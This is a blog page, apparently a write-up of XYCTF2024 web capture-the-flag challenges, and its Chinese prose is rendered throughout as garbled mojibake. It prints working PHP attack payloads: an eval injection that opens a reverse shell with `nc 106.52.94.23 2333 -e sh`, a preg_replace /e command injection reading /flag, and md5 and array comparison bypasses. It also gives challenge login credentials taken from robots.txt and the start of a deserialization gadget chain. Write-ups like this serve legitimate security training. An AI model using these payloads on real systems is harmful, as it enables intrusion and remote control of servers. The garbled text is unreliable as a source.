<!DOCTYPE html>
<html lang="en">
    <head>
  <!-- å…ƒæ•°æ® -->
  <meta charset="utf-8">
  <link rel="icon" href="/images/favicon.ico">
  
  <title>XYCTF2024 Webæ–¹å‘é¢˜è§£ | Err0r233</title>
  <meta name="author" content="Err0r2333" />
  <meta http-equiv="Cache-Control" content="no-transform" />
  <meta http-equiv="Cache-Control" content="no-siteapp" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="robots" content="index,follow" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
  <meta name="format-detection" content="telphone=no, email=no" />
  
    <meta name="keywords" content="Web" />
  
  <meta name="description" content="ä»…ä½œwpè®°å½•ç”¨ï¼Œä¸å®£æ³„ä»»ä½•æƒ…ç»ªï¼Œä»…ä½œçŸ¥è¯†åˆ†äº«">
<meta property="og:type" content="article">
<meta property="og:title" content="XYCTF2024 Webæ–¹å‘é¢˜è§£">
<meta property="og:url" content="http://example.com/posts/52072.html">
<meta property="og:site_name" content="Err0r233">
<meta property="og:description" content="ä»…ä½œwpè®°å½•ç”¨ï¼Œä¸å®£æ³„ä»»ä½•æƒ…ç»ªï¼Œä»…ä½œçŸ¥è¯†åˆ†äº«">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/favicon.ico">
<meta property="article:published_time" content="2024-04-26T14:00:14.000Z">
<meta property="article:modified_time" content="2024-04-26T15:17:38.000Z">
<meta property="article:author" content="Err0r2333">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/favicon.ico">
<meta name="twitter:site" content="@Err0r2333">
  
  <!-- ç«™ç‚¹éªŒè¯ç›¸å…³ -->
  
    
    
    
  
  <!-- æ ·å¼è¡¨æ–‡ä»¶ -->
  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
  
    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
    <script src="/js/kr-dark.min.js"></script>
  
  
    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
  
  
  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
  
  
    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
  
  
    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
  
  <!-- ä¸å¾—ä¸é¢„å…ˆåŠ è½½çš„ä¸€äº›JSæ–‡ä»¶ -->
  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
  
    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
  
  
  <style>
    
      .kratos-cover.kratos-cover-2 {
        background-image: url('/images/banner3.png');
      }
    
    
      @media(min-width:768px) {
        body.custom-background {
          background-image: url('/images/you_are_my_best_friends_forever.jpg');
        }
      }
    
  </style>
  
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Err0r233" type="application/atom+xml">
</head>



    <body class="custom-background">
        <div id="kratos-wrapper">
    <div id="kratos-page">
        <div id="kratos-header">
            <header id="kratos-desktop-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="nav-header">
                        <nav id="kratos-menu-wrap">
                            <ul id="kratos-primary-menu" class="sf-menu">
                                
                                    
                                    
                                        
                                            <li><a href="/"><i class="fa fa-home"></i>é¦–é¡µ</a></li>
                                        
                                    
                                        
                                            <li><a href="/archives/"><i class="fa fa-file"></i>æ¡£æ¡ˆé¦†</a></li>
                                        
                                    
                                        
                                            <li><a href="/friends/"><i class="fa fa-paw"></i>å¥½ä¼™ä¼´</a></li>
                                        
                                    
                                        
                                            <li>
                                                <a><i class="fa fa-link"></i>é“¾æ¥</a>
                                                <ul class="sub-menu">
                                                    
                                                        
                                                    
                                                </ul>
                                            </li>
                                        
                                    
                                
                            </ul>
                        </nav>
                    </div>
                </div>
            </header>
            <header id="kratos-mobile-topnav" class="kratos-topnav">
                <div class="container">
                    <div class="color-logo"><a href="/">Err0r233</a></div>
                    <div class="nav-toggle">
                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
                            <i></i>
                        </a>
                    </div>
                </div>
            </header>
        </div>
        <div class="kratos-start kratos-hero-2">
            <!-- <div class="kratos-overlay"></div> -->
            <div class="kratos-cover kratos-cover-2 text-center">
                <div class="desc desc2 animate-box">
                    <a href="/">
                        <h2>Err0r233</h2> <br />
                        <span>Err0r233çš„ä¸ªäººåšå®¢</span>
                    </a>
                </div>
            </div>
        </div>

        <div id="kratos-blog-post">
            <div class="container">
                <div id="main" class="row">
                    

        

        

            <section class="col-md-8">

        

            <article itemscope itemtype="https://schema.org/Article">
    
    <link itemprop="mainEntityOfPage" href="http://example.com/posts/52072.html">
    <div class="kratos-hentry kratos-post-inner clearfix">
        <header class="kratos-entry-header">
            
                <h1 class="kratos-entry-title text-center" itemprop="name headline">XYCTF2024 Webæ–¹å‘é¢˜è§£</h1>
            
            
            <ul class="kratos-post-meta text-center">
                <li><time datetime="2024-04-26T14:00:14.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2024-04-26</time></li>
                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
                    <i class="fa fa-user"></i> ä½œè€… <span itemprop="name">Err0r2333</span>
                </li>
                <li>
                    <i class="fa fa-edit"></i> 
                    
                    
                        ~73.64K
                    
                    å­—
                </li>
                
                    <li id="/posts/52072.html" class="leancloud_visitors" data-flag-title="XYCTF2024 Webæ–¹å‘é¢˜è§£">
                        <i class="fa fa-eye"></i>
                        <span class="leancloud-visitors-count"> </span> æ¬¡é˜…è¯»
                    </li>
                    
                
            </ul>
        </header>
        <div class="kratos-post-content">
            
            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                <div class="icon"><i class="fa fa-warning"></i></div>
                <div class="text"><p>æœ¬æ–‡æœ€åç¼–è¾‘äº <time datetime="1714144658000"></time> å‰ï¼Œå…¶ä¸­çš„å†…å®¹å¯èƒ½éœ€è¦æ›´æ–°ã€‚</p></div>
            </div>
            
            
            
            <hr />
            <div itemprop="articleBody"><p>ä»…ä½œwpè®°å½•ç”¨ï¼Œä¸å®£æ³„ä»»ä½•æƒ…ç»ªï¼Œä»…ä½œçŸ¥è¯†åˆ†äº«</p>
<span id="more"></span>
<h1><span id="ç‰¢ç‰¢è®°ä½é€è€…ä¸ºå¤§"> ç‰¢ç‰¢è®°ä½ï¼Œé€è€…ä¸ºå¤§</span></h1>
<p>æƒ³ä½ äº†ç‰¢å¤§</p>
<p>é¢˜ç›®æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Kobe</span>(<span class="params"><span class="variable">$cmd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>) &gt; <span class="number">13</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;see you again~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/echo|exec|eval|system|fputs|\.|\/|\\|/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è‚˜æ­»ä½ &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$val_name</span> =&gt; <span class="variable">$val_val</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/i&quot;</span>, <span class="variable">$val_val</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;what can i say&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">Kobe</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span>  . <span class="string">&quot;,manba out&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;#man,&quot;</span> . <span class="variable">$cmd</span> . <span class="string">&quot;,mamba out&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¥½å¤šé™åˆ¶ï¼š</p>
<ul>
<li>é•¿åº¦é™åˆ¶å°äºç­‰äº13</li>
<li>å‘½ä»¤æ‰§è¡Œçš„å‡ ä¸ªå‡½æ•°éƒ½è¢«è¿‡æ»¤äº†</li>
<li>å¯¹äºvalï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¼ å…¥çš„å€¼è¿›è¡Œäº†é™åˆ¶ï¼Œä¸èƒ½å¤Ÿæ˜¯ä¸Šé¢çš„<code>bin|mv|cp|ls|\||f|a|l|\?|\*|\&gt;/</code></li>
<li>evalå‰åéƒ½æœ‰è„æ•°æ®</li>
</ul>
<p>è¿™é‡Œå…¶å®è¿‡æ»¤å€’æ˜¯å…¶æ¬¡ï¼Œè¿™è¾¹è¦è€ƒè™‘çš„æ›´é‡è¦çš„æ˜¯ä¸¤ä¸ªæ–¹é¢ï¼šé•¿åº¦é™åˆ¶å’Œè„æ•°æ®</p>
<p>æˆ‘è¿™è¾¹çš„æ€è·¯ç»å†äº†ä»¥ä¸‹çš„æµç¨‹ï¼š</p>
<ul>
<li>æ•°ç»„ç»•è¿‡strlen</li>
</ul>
<p>ä½†æ˜¯å‘ç°ä¸å¤ªè¡Œï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“å­—ç¬¦ä¸²æ‹¼æ¥ä¹‹åæ•°ç»„ä¼šç›´æ¥å˜æˆArrayï¼š</p>
<img src="/posts/52072/image-20240401134355644.png" class title="awa">
<p>æ‰€ä»¥è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œåªèƒ½å¤Ÿè€è€å®å®ç”¨13ä¸ªå­—ç¬¦é™åˆ¶åšè¿™ä¸ªé¢˜</p>
<ul>
<li>æ‰§è¡Œå‘½ä»¤</li>
</ul>
<p>è¿™é‡Œæˆ‘å…ˆæŠŠKobeçš„é™åˆ¶å»æ‰äº†ï¼Œå˜æˆï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å…ˆæµ‹è¯•å‘½ä»¤æ‰§è¡Œ</p>
<p>å¯ä»¥çœ‹åˆ°evalé‡Œé¢å‰é¢æ˜¯ä¸€ä¸ª<code>#</code>ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªæ³¨é‡Šç¬¦ï¼Œå®ƒèƒ½å¤Ÿå°†åé¢çš„å†…å®¹éƒ½æ³¨é‡Šæ‰ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±ç®—å†™å¥½äº†cmdä¹Ÿæ²¡ç”¨ï¼Œåªèƒ½å¤Ÿæ³¨é‡Šæ‰</p>
<p>ä½†æ˜¯<code>#</code>å’Œ<code>//</code>æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯<strong>å•è¡Œ</strong>æ³¨é‡Šç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦<strong>æ¢è¡Œ</strong>å³å¯ï¼ŒåŠ ä¸ª<code>%0a</code>å°±å¯ä»¥ç»•è¿‡å‰é¢çš„é™åˆ¶</p>
<p>ååŠæ®µå‘¢ï¼Œæˆ‘æ‰“ç®—æ˜¯ç”¨<code>__HALT_COMPILER();</code>ç›´æ¥ç»ˆæ­¢ç¼–è¯‘æˆå­—ç¬¦ä¸²çš„ï¼Œä¹çœ‹ä¹‹ä¸‹å®ƒå¯è¡Œï¼Œä½†æ˜¯å®é™…ä¸Šè¿™ä¸ªå‡½æ•°æœ¬èº«å°±å·²ç»è¶…è¿‡äº†13ä¸ªå­—ç¬¦çš„é™åˆ¶ï¼Œæ›´ä¸è¦è°ˆgetshell</p>
<p>åœ¨è¿™é‡Œæˆ‘å°±å¡ä½äº†ä¸€ä¼šï¼Œå› ä¸ºè¿™ä¸ª<code>HALT_COMPILER</code>æˆ‘çš„å°è±¡æ¯”è¾ƒæ·±åˆ»</p>
<p>ç„¶åæˆ‘æƒ³ç€æƒ³ç€çªç„¶èŒ…å¡é¡¿å¼€ï¼Œå‰é¢çš„<code>#</code>æ³¨é‡Šèƒ½ä¸èƒ½èƒ½ç”¨åˆ°åé¢å»å‘¢ï¼Ÿ</p>
<p>ç„¶åæˆ‘å°±æµ‹è¯•äº†ä¸€ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0asystem(&#x27;dir&#x27;);#</span><br></pre></td></tr></table></figure>
<p>å½“ç„¶è¿™ä¸ª<code>#</code>è¦ç”¨urlencodeæˆ<code>%23</code></p>
<p>ç­”æ¡ˆæ˜¯å¯ä»¥çš„ï¼š</p>
<img src="/posts/52072/image-20240401134940675.png" class title="awa">
<p>æœ¬åœ°æµ‹è¯•diræœ‰ç»“æœ</p>
<p>æ‰€ä»¥å‰åéƒ½ç¡®å®šäº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a + shell + %23</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥å°±æ˜¯åœ¨11ä¸ªå­—ç¬¦çš„é™åˆ¶ä¸‹æ‰“ä¸€ä¸ªshell</p>
<p>æƒ³èµ·pç¥çš„æœ€çŸ­webshellï¼š</p>
<img src="/posts/52072/image-20240401135139317.png" class title="awa">
<p>ä½ çŒœæ€ä¹ˆç€ï¼Œåˆšå¥½11ä¸ªé•¿åº¦</p>
<p>payloadé‚£å°±å‘¼ä¹‹æ¬²å‡ºäº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a`$_GET[1]`;%23&amp;1=dir&gt;1.txt</span><br></pre></td></tr></table></figure>
<p>å›åˆ°é¢˜ç›®ï¼Œè¿˜å¯¹<code>&gt;</code>åšå‡ºäº†é™åˆ¶</p>
<p>æ‰€ä»¥æˆ‘è¿™é‡Œæ‰“ç®—æ‰“ä¸€ä¸ªåå¼¹shellï¼Œåˆšåˆšå¥½é¢˜ç›®æ˜¯å‡ºç½‘çš„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%0a`$_GET[1]`;%23&amp;1=nc%20106.52.94.23%202333%20-e%20sh</span><br></pre></td></tr></table></figure>
<img src="/posts/52072/image-20240401135242219.png" class title="awa">
<h1><span id="warm-up"> warm up</span></h1>
<p>ç¬¬ä¸€å±‚å°±æ˜¯ç®€å•çš„md5</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;next.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$XYCTF</span> = <span class="string">&quot;Warm up&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>] != <span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val1&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;val2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$md5</span>) &amp;&amp; <span class="variable">$md5</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$md5</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ezez&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$XY</span> == <span class="variable">$XYCTF</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$XY</span> != <span class="string">&quot;XYCTF_550102591&quot;</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$XY</span>) == <span class="title function_ invoke__">md5</span>(<span class="string">&quot;XYCTF_550102591&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level2</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä»€ä¹ˆæƒ…å†µ,è¿™ä¹ˆåŸºç¡€çš„md5åšä¸æ¥&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å­¦è¿™ä¹ˆä¹…,ä¼ å‚ä¸ä¼šä¼ ?&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ç”¨ä¸‹é¢è¿™ä¸ªé“¾æ¥å…¨ç§’äº†ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2202_75361164/article/details/130919311">ååºåˆ—åŒ–-md5å’Œsha1ç»•è¿‡_md5ååºåˆ—åŒ–-CSDNåšå®¢</a></p>
<p>å¼±ç­‰ä¸æƒ³æƒ³ï¼Œç›´æ¥ç”¨æ•°ç»„ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val1[]=1&amp;val2[]=2</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢åŒmd5ï¼Œåœ¨ä¸Šé¢çš„æ–‡ç« éšä¾¿æŒ‘ä¸€ä¸ªå°±è¡Œäº†</p>
<img src="/posts/52072/image-20240401135728919.png" class title="awa">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5=0e215962017</span><br></pre></td></tr></table></figure>
<p>æœ€åè¿™ä¸ªï¼Œæˆ‘ä»¬è¦å…ˆçœ‹çœ‹è¿™ä¸ª<code>XYCTF_550102591</code></p>
<p>md5ä¹‹åæ˜¯ä»€ä¹ˆä¸œè¥¿</p>
<img src="/posts/52072/image-20240401135808063.png" class title="awa">
<p>å…¶å®è¿˜æ˜¯ä¸ª0eå¼€å¤´çš„md5ï¼Œé‚£å°±ç®€å•äº†</p>
<p>åˆ©ç”¨<code>extract</code>å°†XYCTFè¦†ç›–æˆå’ŒXYä¸€è‡´çš„å˜é‡ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XYCTF=s878926199a&amp;XY=s878926199a</span><br></pre></td></tr></table></figure>
<p>åˆ°è¾¾ç¬¬äºŒå…³ï¼š</p>
<p><code>LLeeevvveeelll222.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æ“ä½œä½ O.o&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);  <span class="comment">// æˆ‘å¯ä¸ä¼šåƒåˆ«äººä¸€æ ·è®¾ç½®10æ¥ä¸ªlevel</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;æœ‰ç‚¹æ±—æµæµƒèƒŒ&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>preg_match</code>ï¼Œç”¨æ•°ç»„ç»•ï¼š</p>
<img src="/posts/52072/image-20240401140507241.png" class title="awa">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢è¿™ä¸ªpreg_replaceæœ‰ç‚¹ç‰¹åˆ«ï¼Œä¼°è®¡æ˜¯åˆ©ç”¨<code>\e</code>æ¥æ‰§è¡Œå‘½ä»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(\S*)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;, &#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;);</span><br></pre></td></tr></table></figure>
<img src="/posts/52072/image-20240401142918562.png" class title="awa">
<p>æŠ„ä¸€ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=/(\S*)/ei&amp;b=system(&#x27;ls&#x27;)&amp;c=1</span><br></pre></td></tr></table></figure>
<p>å‡ºäº†ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=/(\S*)/ei&amp;b=system(&#x27;cat /flag&#x27;)&amp;c=1</span><br></pre></td></tr></table></figure>
<h1><span id="make-file"> Make File</span></h1>
<p>ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(shell cat /flag)</span><br></pre></td></tr></table></figure>
<h1><span id="ezmd5"> ezmd5</span></h1>
<p>ä¸¤å¼ å›¾ç‰‡å¦‚ä¸‹ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://crypto.stackexchange.com/questions/1434/are-there-two-known-strings-which-have-the-same-md5-hash-value">cryptanalysis - Are there two known strings which have the same MD5 hash value? - Cryptography Stack Exchange</a></p>
<img src="/posts/52072/ship.jpg" class title="awa">
<img src="/posts/52072/plane.jpg" class title="awa">
<h1><span id="ezhttp"> ezhttp</span></h1>
<p>ç™»å½•æ¡†ï¼Œf12æ‰¾åˆ°æç¤ºè—åœ¨æŸä¸ªåœ°æ–¹</p>
<p>å…¶å®è¿™ä¸ªæ—¶å€™å¯ä»¥dirsearchå¼€æœ</p>
<p>ä½†æ˜¯è¿™è¾¹å¯ä»¥çŒœä¸€çŒœï¼ŒçŒœåˆ°äº†robots.txt:</p>
<img src="/posts/52072/image-20240401144301765.png" class title="awa">
<p>è®¿é—®è¿™ä¸ªtxt</p>
<img src="/posts/52072/image-20240401144319758.png" class title="awa">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: XYCTF</span><br><span class="line">password: @JOILha!wuigqi123$</span><br></pre></td></tr></table></figure>
<p>ç„¶åæ‹¿hackbaræ“ä¸€ä¸‹ï¼š</p>
<img src="/posts/52072/image-20240401204251669.png" class title="awa">
<h1><span id="ezpop"> ezpop</span></h1>
<p>çœ‹åˆ°æœ‰ä¸ª<code>throw Exception</code>å°±å¯ä»¥æƒ³åˆ°åˆ©ç”¨gcå›æ”¶æœºåˆ¶æ¥ç»•è¿‡</p>
<p>é“¾å­ç»ˆç‚¹<code>BBB-&gt;__get</code></p>
<p>é€šè¿‡<code>AAA-&gt;__toString</code>è®¿é—®<code>BBBç±»çš„$p</code>æ¥è¿›å…¥BBB</p>
<p>é€šè¿‡<code>CCC-&gt;destruct</code>è¿›å…¥toString</p>
<p>é“¾å­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCC::__destruct() -&gt; AAA::__toString() -&gt; BBB::__get()</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯è¿™é‡Œè¦ç®€å•çš„æµ‹ä¸€ä¸‹ä¸­é—´è¿™ä¸ªï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (isset($b[&#x27;a&#x27;])) &#123;</span><br><span class="line">            unset($b[&#x27;a&#x27;]);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>å¼„å‡ºæ¥æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿</p>
<p>è¿™é‡Œå‡ºäº†ä¸ªå¥—å¨ƒï¼Œç®€å•åœ°çœ‹ä¸€ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func($a,$b)($c)($d);</span><br></pre></td></tr></table></figure>
